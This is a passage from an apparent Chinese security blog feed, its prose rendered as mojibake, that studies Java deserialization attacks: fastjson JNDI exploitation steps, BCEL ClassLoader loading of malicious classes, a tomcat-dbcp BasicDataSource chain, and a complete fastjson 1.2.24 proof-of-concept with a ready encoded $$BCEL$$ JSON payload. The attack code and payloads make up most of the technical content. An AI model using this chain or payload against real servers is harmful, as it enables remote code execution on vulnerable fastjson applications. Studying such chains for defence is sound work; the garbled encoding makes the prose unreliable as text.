class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExploitTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ExploitTest</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">//ç›´æ¥åœ¨æ„é€ æ–¹æ³•ä¸­è¿è¡Œè®¡ç®—å™¨</span></span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…·ä½“æ“ä½œï¼š</p><p>1.åœ¨æœåŠ¡å™¨å¼€å¯RMIæˆ–è€…LDAPæœåŠ¡</p><p>2.åœ¨åŒç›®å½•ä¸‹å¼€å¯httpæœåŠ¡</p><p>3.å°†Exploit.javaç¼–è¯‘ä¸ºclassæ–‡ä»¶ï¼Œæ”¾åˆ°ä¸Šè¾¹å¼€å¯æœåŠ¡çš„åŒç›®å½•ä¸‹</p><p>4.æ‰§è¡ŒFastJsonServer.java</p>]]></content>
    
    
    <summary type="html">æ•´ç†çš„ç¬”è®°</summary>
    
    
    
    <category term="java" scheme="https://bowuchuling.github.io/categories/java/"/>
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/categories/java/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="java" scheme="https://bowuchuling.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>BCELåŠ è½½æ¶æ„ç±»</title>
    <link href="https://bowuchuling.github.io/posts/18juyiuw0.html"/>
    <id>https://bowuchuling.github.io/posts/18juyiuw0.html</id>
    <published>2024-03-28T11:18:58.793Z</published>
    <updated>2024-03-28T12:51:13.703Z</updated>
    
    <content type="html"><![CDATA[<h1>BCEL</h1><p>ä¸‹é¢å°†è®²è¿°bcelåŠ è½½æ¶æ„ç±»çš„è¯¦ç»†è¿‡ç¨‹</p><h2 id="BCELæ˜¯ä»€ä¹ˆ">BCELæ˜¯ä»€ä¹ˆ</h2><p>å¼•ç”¨è‡ªCSDN</p><p>BCELåŸæœ¬æ˜¯Apache Jakartaçš„ä¸€ä¸ªå­é¡¹ç›®ï¼Œåæ¥æˆä¸ºäº†Apache Commonsçš„ä¸€ä¸ªå­é¡¹ç›®ã€‚Apache Commons Collectionsæƒ³å¿…å¤§å®¶éƒ½çŸ¥é“ï¼Œå°±æ˜¯å¸¸è¯´çš„CCé“¾ï¼Œä¹Ÿæ˜¯Apache Commonsçš„ä¸€ä¸ªå­é¡¹ç›®</p><p>BCELä¸»è¦ç”¨äºåˆ†æã€åˆ›å»ºã€æ“çºµJava classæ–‡ä»¶ï¼ŒåŒ…å«åœ¨åŸç”ŸåŸç”ŸJDKä¸­ï¼ˆcom.sun.org.apache.bcelï¼‰ï¼Œä¹‹æ‰€ä»¥åŒ…å«åœ¨åŸç”ŸJDKä¸»è¦åŸå› å¯èƒ½æ˜¯ä¸ºäº†æ”¯æ’‘Java XMLçš„ä¸€äº›åŠŸèƒ½ï¼ŒJava XMLåŠŸèƒ½åŒ…å«äº†JAXPï¼ˆJava API for XML Processingï¼‰è§„èŒƒï¼ŒJavaä¸­è‡ªå¸¦çš„JAXPå®ç°ä½¿ç”¨äº†Apache Xerceså’ŒApache Xalanï¼ŒApache Xalanåˆä¾èµ–äº†BCELï¼Œæ‰€ä»¥BCELä¹Ÿè¢«æ”¾å…¥äº†æ ‡å‡†åº“ä¸­ã€‚</p><p>Apache Xalanå®ç°äº†å…¶ä¸­XSLTç›¸å…³çš„éƒ¨åˆ†ï¼Œå…¶ä¸­åŒ…æ‹¬xsltc compilerã€‚</p><p>XSLTC Compilerå°±æ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œç¼–è¯‘å™¨ï¼Œå¯ä»¥å°†ä¸€ä¸ªxslæ–‡ä»¶ç¼–è¯‘æˆä¸€ä¸ªclassæ–‡ä»¶æˆ–jaræ–‡ä»¶ï¼Œç¼–è¯‘åçš„classè¢«ç§°ä¸ºtransletï¼Œå¯ä»¥åœ¨åç»­ç”¨äºå¯¹XMLæ–‡ä»¶çš„è½¬æ¢ã€‚å…¶å®å°±å°†XSLTçš„åŠŸèƒ½è½¬åŒ–æˆäº†Javaä»£ç ï¼Œä¼˜åŒ–æ‰§è¡Œçš„é€Ÿåº¦ï¼Œå¦‚æœæˆ‘ä»¬ä¸ä½¿ç”¨è¿™ä¸ªå‘½ä»¤è¡Œç¼–è¯‘å™¨è¿›è¡Œç¼–è¯‘ï¼ŒJavaå†…éƒ¨ä¹Ÿä¼šåœ¨è¿è¡Œè¿‡ç¨‹ä¸­å­˜åœ¨ç¼–è¯‘çš„è¿‡ç¨‹ã€‚</p><p>å› ä¸ºéœ€è¦ç¼–è¯‘æ–‡ä»¶ï¼Œå®é™…ä¸Šæ˜¯åŠ¨æ€ç”ŸæˆJavaå­—èŠ‚ç ï¼ŒBCELæ­£æ˜¯ä¸€ä¸ªJavaå¤„ç†å­—èŠ‚ç çš„åº“ï¼Œæ‰€ä»¥Apache Xalanåˆä¾èµ–äº†BCEL</p><h2 id="CalssLoader">CalssLoader</h2><p>æµ‹è¯•ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> classloader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestBCEL</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;\$\$BCEL\$\$xd&quot;</span>;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ClassLoader</span>().loadClass(str).newInstance();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…ˆå¯¹äºbcelçš„ç±»åŠ è½½æœºåˆ¶com.sun.org.apache.bcel.internal.util.ClassLoaderè¿›è¡Œæ–­ç‚¹åˆ†æï¼Œå¯ä»¥å¾—åˆ°å¦‚ä¸‹ä»£ç </p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240320223023444.png" alt="image-20240320223023444"></p><p>å¯è§ClassLoaderä¸­å¯¹äº$$BCEL$$å­—æ®µè¿›è¡Œäº†åˆ¤æ–­ï¼Œå¦‚æœå­˜åœ¨å°±å¯¹class_nameæ‰§è¡Œcreate_classæ–¹æ³•ï¼Œè·Ÿè¸ªè¯¥æ–¹æ³•ï¼Œç»“æœå¦‚ä¸‹</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240320223944065.png" alt="image-20240320223944065"></p><p>ä¸ªäººæ„Ÿè§‰è¿™é‡Œå°±æ˜¯å¯¹bcelå¯ä»¥åŠ è½½æ¶æ„ç±»æœ€ç›´è§‚çš„è§£é‡Šï¼Œæ ¹æ®ä»£ç é€»è¾‘ï¼Œå…¶æˆªå–äº†$$BCEL$$ä¹‹åçš„å­—ç¬¦ï¼Œå¹¶å°†å…¶è§£ç ï¼Œä»¥ç±»çš„å½¢å¼è¿”å›ï¼Œå›åˆ°ä¸Šå±‚ä»£ç ç»§ç»­åˆ†æ</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240320224545715.png" alt="image-20240320224545715"></p><p>å¾—åˆ°clazzä¹‹åå°±åˆ°è¾¾äº†ä¸‹é¢æ¡†æ¡†é‡Œçš„ä»£ç ï¼Œè°ƒç”¨äº†ClassLoaderç±»çš„æ ¸å¿ƒæ–¹æ³•<code>defineClass</code>ï¼ˆå®šä¹‰ä¸€ä¸ªJavaç±»ï¼‰ï¼Œå¦‚æœæˆ‘ä»¬åœ¨$$BCEL$$åè¡—ä¸Šæ¶æ„ç±»çš„ä»£ç ï¼Œåœ¨è¿™é‡Œå°±ä¼šå°†å…¶å½»åº•è§£æï¼Œè¿›è€Œå®Œæˆæ¶æ„ç±»çš„æ„é€ ã€‚</p><h2 id="æ„é€ æ¶æ„ç±»">æ„é€ æ¶æ„ç±»</h2><p>äº†è§£äº†bcelåŠ è½½æ¶æ„ç±»çš„è¿‡ç¨‹ï¼Œä¸‹é¢å°±éœ€è¦è¿›è¡Œæ¶æ„ç±»çš„æ„é€ ï¼Œå…³é”®åœ¨äºä¸Šé¢åˆ†æè¿‡çš„createClassæ–¹æ³•ï¼Œå…¶ä¸­å¯¹äº$$BCEL$$åçš„ä»£ç è¿›è¡Œäº†è§£ç å¤„ç†ï¼Œå¦‚ä¸‹å›¾</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240320225449811.png" alt="image-20240320225449811"></p><p>æ‰€ä»¥æˆ‘ä»¬æ„é€ çš„æ—¶å€™éœ€è¦å°†ç±»è¿›è¡ŒåŒæ ·çš„ç¼–ç å¤„ç†ï¼Œæµ‹è¯•ä»£ç å¦‚ä¸‹</p><p><strong>TestBCEL.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> classloader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestBCEL</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//å¯¼å…¥æ¶æ„ç±»</span></span><br><span class="line">            <span class="type">JavaClass</span> <span class="variable">javaClass</span> <span class="operator">=</span> Repository.lookupClass(classloader.Calc.class);</span><br><span class="line">            <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;\$\$BCEL\$\$&quot;</span>;</span><br><span class="line">        <span class="comment">//å°†æ¶æ„ç±»çš„å­—èŠ‚ç ç¼–ç åå’Œ\$\$BCEL\$\$æ‹¼æ¥</span></span><br><span class="line">            str += Utility.encode(javaClass.getBytes(),<span class="literal">true</span>);</span><br><span class="line">            <span class="comment">//åˆ©ç”¨bcelåŠ è½½æ¶æ„ç±»</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ClassLoader</span>().loadClass(str).newInstance();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Calc.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> classloader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Calc</span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœï¼ŒæˆåŠŸå¼¹å‡ºè®¡ç®—å™¨</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240320225755058.png" alt="image-20240320225755058"></p><h2 id="tomcat-dbcpåˆ†æ">tomcat-dbcpåˆ†æ</h2><p>ä¸‹é¢å°†ä¼šå°†bcelå’Œdbcpç»“åˆèµ·æ¥ç»¼åˆåˆ†æï¼Œåˆ©ç”¨é“¾å¦‚ä¸‹</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BasicDataSource<span class="selector-class">.getConnection</span>() &gt; <span class="built_in">createDataSource</span>() &gt; <span class="built_in">createConnectionFactory</span>()</span><br></pre></td></tr></table></figure><p>è·Ÿè¸ªBasicDataSource#getConnectionæ–¹æ³•</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240321094112777.png" alt="image-20240321094112777"></p><p>ç»§ç»­è·Ÿè¸ªBasicDataSource#createDataSourceæ–¹æ³•</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240321094218327.png" alt="image-20240321094218327"></p><p>å¯ä»¥å‘ç°åœ¨è¿™é‡Œè°ƒç”¨äº†BasicDataSource#createConnectionFactoryï¼Œç»§ç»­è·Ÿè¸ªè¯¥æ–¹æ³•</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240321094308710.png" alt="image-20240321094308710"></p><p>driverClassNameå’ŒdriverClassLoaderéƒ½æ˜¯è¯¥ç±»ä¸‹çš„æˆå‘˜å˜é‡ï¼ˆå¯æ§ï¼‰ï¼Œå¹¶åˆ©ç”¨forNameå‡½æ•°è¿›è¡Œäº†ç±»åŠ è½½</p><p><strong>ç±»åŠ è½½æœºåˆ¶</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åå°„åŠ è½½TestHelloWorldç¤ºä¾‹</span></span><br><span class="line">Class.forName(<span class="string">&quot;com.anbai.sec.classloader.TestHelloWorld&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ClassLoaderåŠ è½½TestHelloWorldç¤ºä¾‹</span></span><br><span class="line"><span class="built_in">this</span>.getClass().getClassLoader().loadClass(<span class="string">&quot;com.anbai.sec.classloader.TestHelloWorld&quot;</span>);</span><br></pre></td></tr></table></figure><p><code>Class.forName(&quot;ç±»å&quot;)</code>é»˜è®¤ä¼šåˆå§‹åŒ–è¢«åŠ è½½ç±»çš„é™æ€å±æ€§å’Œæ–¹æ³•ï¼Œå¦‚æœä¸å¸Œæœ›åˆå§‹åŒ–ç±»å¯ä»¥ä½¿ç”¨<code>Class.forName(&quot;ç±»å&quot;, æ˜¯å¦åˆå§‹åŒ–ç±», ç±»åŠ è½½å™¨)</code>ï¼Œè€Œ<code>ClassLoader.loadClass</code>é»˜è®¤ä¸ä¼šåˆå§‹åŒ–ç±»æ–¹æ³•ã€‚</p><p>è‡³æ­¤ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨Class.forNameæ–¹æ³•å®ç°æˆ‘ä»¬çš„æ¶æ„ç±»åŠ è½½ï¼ŒéªŒè¯è„šæœ¬å¦‚ä¸‹</p><p><strong>FjBCEL.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> classloader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.dbcp.dbcp.BasicDataSource;</span><br><span class="line"><span class="comment">//import org.apache.commons.dbcp.BasicDataSource;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FjBCEL</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, SQLException &#123;</span><br><span class="line">        <span class="comment">//fj1.2.24</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassLoader</span>();</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">javaClass</span> <span class="operator">=</span> Repository.lookupClass(classloader.Calc.class);</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;\$\$BCEL\$\$&quot;</span>;</span><br><span class="line">        str += Utility.encode(javaClass.getBytes(),<span class="literal">true</span>);</span><br><span class="line">        <span class="type">BasicDataSource</span> <span class="variable">basicDataSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BasicDataSource</span>();</span><br><span class="line">        basicDataSource.setDriverClassLoader(classLoader);</span><br><span class="line">        basicDataSource.setDriverClassName(str);</span><br><span class="line">        basicDataSource.getConnection();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœï¼ŒæˆåŠŸå¼¹å‡ºè®¡ç®—å™¨</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240321094644237.png" alt="image-20240321094644237"></p><h2 id="BCEL-dbcp-fastjson">BCEL-dbcp-fastjson</h2><p>ä¸‹é¢å°†ä¼šå°†ä¸Šé¢æ‰€è¯´çš„bcelï¼Œdbcpå’Œfjç»“åˆèµ·æ¥ï¼Œåˆ©ç”¨fjè§¦å‘è¯¥åˆ©ç”¨é“¾</p><p>åˆ©ç”¨é“¾å…¥å£å°±æ˜¯ä¸Šé¢æåˆ°çš„BasicDataSource#getConnectionæ–¹æ³•ï¼Œä½†è¯¥ç±»å¹¶æ²¡æœ‰Connectionæˆå‘˜å˜é‡ï¼Œé‚£ä»–æ˜¯å¦‚ä½•è°ƒç”¨çš„å‘¢ï¼Ÿ</p><p><strong>FastJsonä¸­çš„ parse() å’Œ parseObject()æ–¹æ³•éƒ½å¯ä»¥ç”¨æ¥å°†JSONå­—ç¬¦ä¸²ååºåˆ—åŒ–æˆJavaå¯¹è±¡ï¼ŒparseObject() æœ¬è´¨ä¸Šä¹Ÿæ˜¯è°ƒç”¨ parse() è¿›è¡Œååºåˆ—åŒ–çš„ã€‚ä½†æ˜¯ parseObject() ä¼šé¢å¤–çš„å°†Javaå¯¹è±¡è½¬ä¸º JSONObjectå¯¹è±¡ï¼Œå³ JSON.toJSON()ã€‚æ‰€ä»¥è¿›è¡Œååºåˆ—åŒ–æ—¶çš„ç»†èŠ‚åŒºåˆ«åœ¨äºï¼Œparse() ä¼šè¯†åˆ«å¹¶è°ƒç”¨ç›®æ ‡ç±»çš„ setter æ–¹æ³•åŠæŸäº›ç‰¹å®šæ¡ä»¶çš„ getter æ–¹æ³•(è¯¦è§fjçš„è§¦å‘è¯¦ç»†è¿‡ç¨‹)ï¼Œè€Œ parseObject() ç”±äºå¤šæ‰§è¡Œäº† JSON.toJSON(obj)ï¼Œæ‰€ä»¥åœ¨å¤„ç†è¿‡ç¨‹ä¸­ä¼šè°ƒç”¨ååºåˆ—åŒ–ç›®æ ‡ç±»çš„æ‰€æœ‰ setter å’Œ getter æ–¹æ³•ã€‚</strong></p><p>å…ˆç»™å‡ºæµ‹è¯•POC</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> classloader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.dbcp.dbcp.BasicDataSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FjBCEL</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, SQLException &#123;</span><br><span class="line">        <span class="comment">//fj1.2.24</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassLoader</span>();</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">javaClass</span> <span class="operator">=</span> Repository.lookupClass(classloader.Calc.class);</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;\$\$BCEL\$\$&quot;</span>;</span><br><span class="line">        str += Utility.encode(javaClass.getBytes(),<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span></span><br><span class="line">                <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                        + <span class="string">&quot;    &#123;\n&quot;</span></span><br><span class="line">                        + <span class="string">&quot;        \&quot;aaa\&quot;: &#123;\n&quot;</span></span><br><span class="line">                        + <span class="string">&quot;                \&quot;@type\&quot;: \&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource\&quot;,\n&quot;</span></span><br><span class="line">                        + <span class="string">&quot;                \&quot;driverClassLoader\&quot;: &#123;\n&quot;</span></span><br><span class="line">                        + <span class="string">&quot;                    \&quot;@type\&quot;: \&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;\n&quot;</span></span><br><span class="line">                        + <span class="string">&quot;                &#125;,\n&quot;</span></span><br><span class="line">                        + <span class="string">&quot;                \&quot;driverClassName\&quot;: \&quot;&quot;</span>+str+<span class="string">&quot;\&quot;\n&quot;</span></span><br><span class="line">                        + <span class="string">&quot;        &#125;\n&quot;</span></span><br><span class="line">                        + <span class="string">&quot;    &#125;:\&quot;xxx\&quot;\n&quot;</span></span><br><span class="line">                        + <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line"><span class="comment">//        BasicDataSource basicDataSource = new BasicDataSource();</span></span><br><span class="line"><span class="comment">//        basicDataSource.setDriverClassLoader(classLoader);</span></span><br><span class="line"><span class="comment">//        basicDataSource.setDriverClassName(str);</span></span><br><span class="line"><span class="comment">//        basicDataSource.getConnection();</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;aaa&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;driverClassLoader&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;driverClassName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\$\$BCEL\$\$$l$8b$I$A$A$A$A$A$A$Am$91$c9N$c3$40$M$86$ffi$d3$s$N$v$85B$d9$f7$b5p$a0$H$8e$m$$$I$$$84E$U$c1y$3a$j$95$viR$rS$c4$hq$e6$C$88$D$P$c0C$n$3ca$V$Q$vv$fc$db$fel$x$_$afO$cf$A6$b1$e2$c2$c1$a8$8b1$8c$3b$980$7e$d2$c6$94$8b$i$a6m$cc$d8$98e$c8o$abP$e9$j$86lu$ed$9c$c1$da$8d$9a$92$a1$e4$abP$k$f5$3a$N$Z$9f$f1F$40J$d9$8f$E$P$cey$acL$fc$nZ$faR$r$s$t$C$9e$qA$c4$9b2$ae$ed$f2$40l18$db$o$f8$403$w$ad$f8m$7e$cdk$B$P$5b$b5$bd$h$n$bbZE$n$95$V$eb$9a$8b$abC$deM$91$b4$j$83$5b$8fz$b1$90$fb$ca$8c$u$Y$dc$86$e9$f5P$80kc$ce$c3$3c$Wh6$ad$p$3c$yb$89a$e8$l$b6$87e$b8$M$D$bfW$p$e9$bb$fa$b8$d1$96B3$M$7eK$a7$bdP$ab$OMv$5bR$7f$F$95$ea$9a$ff$a7$86$d6$b7$e4$8d$q$e4j$f5G$b6$aec$V$b6$b6$7e6$9c$c4$91$90IB$N$a5$$$ruz$f4Y$cc$85$a4cl$faI$e6$c9$80$99$T$c9$f6QT$p$cf$c8$e7$d6$l$c0$ee$d2$b4G6$9f$8aY$U$c9z$ef$F$e8G$89$bc$83$81$aff$9e$c2$80$f2$p2$e5$ec$3d$ac$8b$5b8$H$eb$f7$c8$df$a5z$81zsD1$c4$R$fa2$dcB$aa$daDv0H$a4$cf$JEX$U$97$v$g$a2$d7F$c6$b71lQ$a2$92$$5$f2$G$933$ed$e9n$C$A$A&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">:</span><span class="string">&quot;xxx&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å½“æˆ‘ä»¬åˆ©ç”¨parse()æ–¹æ³•çš„æ—¶å€™</p><p><img 